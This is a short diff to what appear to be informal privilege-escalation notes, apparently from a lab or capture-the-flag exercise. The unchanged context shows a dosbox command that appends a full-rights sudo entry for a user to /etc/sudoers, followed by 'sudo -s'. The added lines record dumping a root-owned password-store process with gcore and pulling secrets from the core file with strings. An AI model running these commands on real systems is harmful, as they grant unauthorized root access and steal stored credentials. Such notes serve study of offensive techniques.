@@ -67,6 +67,10 @@ LFILE='/etc/sudoers'
 /usr/bin/dosbox -c 'mount c /' -c "echo commander ALL=(ALL:ALL) ALL >>c:$LFILE" -c exit
 sudo -s
 
+/usr/bin/gcore 493    ..to dump/catch password-store process
+ps -aux | grep pass   ..found root: /usr/bin/password-store 
+strings core.493      ..created, even though errors 
+
 =================================== 
 Watch for Injections for Rootbash
 
